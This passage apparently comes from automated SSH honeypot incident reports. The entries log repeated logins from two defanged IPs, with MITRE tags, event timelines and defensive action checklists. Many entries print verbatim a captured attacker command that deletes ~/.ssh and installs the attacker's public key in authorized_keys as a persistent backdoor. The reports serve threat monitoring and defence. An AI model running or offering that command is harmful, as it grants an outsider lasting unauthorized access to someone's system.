| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:29:38` | `cowrie.session.connect` |
| `2026-05-25 19:29:38` | `cowrie.client.version` |
| `2026-05-25 19:29:38` | `cowrie.client.kex` |
| `2026-05-25 19:29:39` | `cowrie.login.success` |
| `2026-05-25 19:29:39` | `cowrie.session.params` |
| `2026-05-25 19:29:39` | `cowrie.command.input` |
| `2026-05-25 19:29:39` | `cowrie.command.failed` |
| `2026-05-25 19:29:39` | `cowrie.log.closed` |
| `2026-05-25 19:29:40` | `cowrie.session.params` |
| `2026-05-25 19:29:40` | `cowrie.command.input` |
| `2026-05-25 19:29:40` | `cowrie.session.file_download` |
| `2026-05-25 19:29:40` | `cowrie.log.closed` |
| `2026-05-25 19:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0aec2b64965

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:29 |
| **Last Seen** | 2026-05-25 19:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:29:42` | `cowrie.session.connect` |
| `2026-05-25 19:29:42` | `cowrie.client.version` |
| `2026-05-25 19:29:42` | `cowrie.client.kex` |
| `2026-05-25 19:29:42` | `cowrie.login.success` |
| `2026-05-25 19:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08c6e4855584

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:31 |
| **Last Seen** | 2026-05-25 19:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:31:11` | `cowrie.session.connect` |
| `2026-05-25 19:31:11` | `cowrie.client.version` |
| `2026-05-25 19:31:11` | `cowrie.client.kex` |
| `2026-05-25 19:31:12` | `cowrie.login.success` |
| `2026-05-25 19:31:12` | `cowrie.session.params` |
| `2026-05-25 19:31:12` | `cowrie.command.input` |
| `2026-05-25 19:31:12` | `cowrie.command.failed` |
| `2026-05-25 19:31:12` | `cowrie.log.closed` |
| `2026-05-25 19:31:12` | `cowrie.session.params` |
| `2026-05-25 19:31:12` | `cowrie.command.input` |
| `2026-05-25 19:31:12` | `cowrie.session.file_download` |
| `2026-05-25 19:31:12` | `cowrie.log.closed` |
| `2026-05-25 19:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b466da101c1

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:31 |
| **Last Seen** | 2026-05-25 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:31:14` | `cowrie.session.connect` |
| `2026-05-25 19:31:14` | `cowrie.client.version` |
| `2026-05-25 19:31:15` | `cowrie.client.kex` |
| `2026-05-25 19:31:15` | `cowrie.login.success` |
| `2026-05-25 19:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee22545e9b4d

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:31 |
| **Last Seen** | 2026-05-25 19:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:31:52` | `cowrie.session.connect` |
| `2026-05-25 19:31:52` | `cowrie.client.version` |
| `2026-05-25 19:31:52` | `cowrie.client.kex` |
| `2026-05-25 19:31:52` | `cowrie.login.success` |
| `2026-05-25 19:31:53` | `cowrie.session.params` |
| `2026-05-25 19:31:53` | `cowrie.command.input` |
| `2026-05-25 19:31:53` | `cowrie.command.failed` |
| `2026-05-25 19:31:53` | `cowrie.log.closed` |
| `2026-05-25 19:31:53` | `cowrie.session.params` |
| `2026-05-25 19:31:53` | `cowrie.command.input` |
| `2026-05-25 19:31:53` | `cowrie.session.file_download` |
| `2026-05-25 19:31:53` | `cowrie.log.closed` |
| `2026-05-25 19:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cada7d974e51

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:31 |
| **Last Seen** | 2026-05-25 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:31:55` | `cowrie.session.connect` |
| `2026-05-25 19:31:55` | `cowrie.client.version` |
| `2026-05-25 19:31:55` | `cowrie.client.kex` |
| `2026-05-25 19:31:56` | `cowrie.login.success` |
| `2026-05-25 19:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff2bac324bfe

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:32 |
| **Last Seen** | 2026-05-25 19:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:32:14` | `cowrie.session.connect` |
| `2026-05-25 19:32:14` | `cowrie.client.version` |
| `2026-05-25 19:32:14` | `cowrie.client.kex` |
| `2026-05-25 19:32:15` | `cowrie.login.success` |
| `2026-05-25 19:32:15` | `cowrie.session.params` |
| `2026-05-25 19:32:15` | `cowrie.command.input` |
| `2026-05-25 19:32:15` | `cowrie.command.failed` |
| `2026-05-25 19:32:15` | `cowrie.log.closed` |
| `2026-05-25 19:32:16` | `cowrie.session.params` |
| `2026-05-25 19:32:16` | `cowrie.command.input` |
| `2026-05-25 19:32:16` | `cowrie.session.file_download` |
| `2026-05-25 19:32:16` | `cowrie.log.closed` |
| `2026-05-25 19:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e525d20fd04b

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:32 |
| **Last Seen** | 2026-05-25 19:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:32:18` | `cowrie.session.connect` |
| `2026-05-25 19:32:18` | `cowrie.client.version` |
| `2026-05-25 19:32:18` | `cowrie.client.kex` |
| `2026-05-25 19:32:18` | `cowrie.login.success` |
| `2026-05-25 19:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd23f53a2fb

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:32 |
| **Last Seen** | 2026-05-25 19:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:32:40` | `cowrie.session.connect` |
| `2026-05-25 19:32:40` | `cowrie.client.version` |
| `2026-05-25 19:32:40` | `cowrie.client.kex` |
| `2026-05-25 19:32:40` | `cowrie.login.success` |
| `2026-05-25 19:32:41` | `cowrie.session.params` |
| `2026-05-25 19:32:41` | `cowrie.command.input` |
| `2026-05-25 19:32:41` | `cowrie.command.failed` |
| `2026-05-25 19:32:41` | `cowrie.log.closed` |
| `2026-05-25 19:32:41` | `cowrie.session.params` |
| `2026-05-25 19:32:41` | `cowrie.command.input` |
| `2026-05-25 19:32:41` | `cowrie.session.file_download` |
| `2026-05-25 19:32:41` | `cowrie.log.closed` |
| `2026-05-25 19:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9392851ffe65

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:32 |
| **Last Seen** | 2026-05-25 19:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:32:43` | `cowrie.session.connect` |
| `2026-05-25 19:32:43` | `cowrie.client.version` |
| `2026-05-25 19:32:43` | `cowrie.client.kex` |
| `2026-05-25 19:32:44` | `cowrie.login.success` |
| `2026-05-25 19:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff2ba0049499

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:33 |
| **Last Seen** | 2026-05-25 19:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:33:03` | `cowrie.session.connect` |
| `2026-05-25 19:33:03` | `cowrie.client.version` |
| `2026-05-25 19:33:03` | `cowrie.client.kex` |
| `2026-05-25 19:33:03` | `cowrie.login.success` |
| `2026-05-25 19:33:03` | `cowrie.session.params` |
| `2026-05-25 19:33:03` | `cowrie.command.input` |
| `2026-05-25 19:33:03` | `cowrie.command.failed` |
| `2026-05-25 19:33:04` | `cowrie.log.closed` |
| `2026-05-25 19:33:04` | `cowrie.session.params` |
| `2026-05-25 19:33:04` | `cowrie.command.input` |
| `2026-05-25 19:33:04` | `cowrie.session.file_download` |
| `2026-05-25 19:33:04` | `cowrie.log.closed` |
| `2026-05-25 19:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-466a4d3ab59e

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:33 |
| **Last Seen** | 2026-05-25 19:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:33:06` | `cowrie.session.connect` |
| `2026-05-25 19:33:06` | `cowrie.client.version` |
| `2026-05-25 19:33:06` | `cowrie.client.kex` |
| `2026-05-25 19:33:07` | `cowrie.login.success` |
| `2026-05-25 19:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc14908e999e

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:34 |
| **Last Seen** | 2026-05-25 19:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:34:16` | `cowrie.session.connect` |
| `2026-05-25 19:34:16` | `cowrie.client.version` |
| `2026-05-25 19:34:16` | `cowrie.client.kex` |
| `2026-05-25 19:34:17` | `cowrie.login.success` |
| `2026-05-25 19:34:17` | `cowrie.session.params` |
| `2026-05-25 19:34:17` | `cowrie.command.input` |
| `2026-05-25 19:34:17` | `cowrie.command.failed` |
| `2026-05-25 19:34:17` | `cowrie.log.closed` |
| `2026-05-25 19:34:18` | `cowrie.session.params` |
| `2026-05-25 19:34:18` | `cowrie.command.input` |
| `2026-05-25 19:34:18` | `cowrie.session.file_download` |
| `2026-05-25 19:34:18` | `cowrie.log.closed` |
| `2026-05-25 19:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5df69986b5f1

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:34 |
| **Last Seen** | 2026-05-25 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:34:20` | `cowrie.session.connect` |
| `2026-05-25 19:34:20` | `cowrie.client.version` |
| `2026-05-25 19:34:20` | `cowrie.client.kex` |
| `2026-05-25 19:34:20` | `cowrie.login.success` |
| `2026-05-25 19:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624fd799b5cb

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:35 |
| **Last Seen** | 2026-05-25 19:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:35:46` | `cowrie.session.connect` |
| `2026-05-25 19:35:46` | `cowrie.client.version` |
| `2026-05-25 19:35:47` | `cowrie.client.kex` |
| `2026-05-25 19:35:47` | `cowrie.login.success` |
| `2026-05-25 19:35:47` | `cowrie.session.params` |
| `2026-05-25 19:35:47` | `cowrie.command.input` |
| `2026-05-25 19:35:47` | `cowrie.command.failed` |
| `2026-05-25 19:35:47` | `cowrie.log.closed` |
| `2026-05-25 19:35:48` | `cowrie.session.params` |
| `2026-05-25 19:35:48` | `cowrie.command.input` |
| `2026-05-25 19:35:48` | `cowrie.session.file_download` |
| `2026-05-25 19:35:48` | `cowrie.log.closed` |
| `2026-05-25 19:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd101fbc654

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-05-25 19:35 |
| **Last Seen** | 2026-05-25 19:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:35:50` | `cowrie.session.connect` |
| `2026-05-25 19:35:50` | `cowrie.client.version` |
| `2026-05-25 19:35:50` | `cowrie.client.kex` |
| `2026-05-25 19:35:51` | `cowrie.login.success` |
| `2026-05-25 19:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51ce49b4a27

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 19:41 |
| **Last Seen** | 2026-05-25 19:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:41:37` | `cowrie.session.connect` |
| `2026-05-25 19:41:37` | `cowrie.client.version` |
| `2026-05-25 19:41:37` | `cowrie.client.kex` |
| `2026-05-25 19:41:38` | `cowrie.login.success` |
| `2026-05-25 19:41:39` | `cowrie.session.params` |
| `2026-05-25 19:41:39` | `cowrie.command.input` |
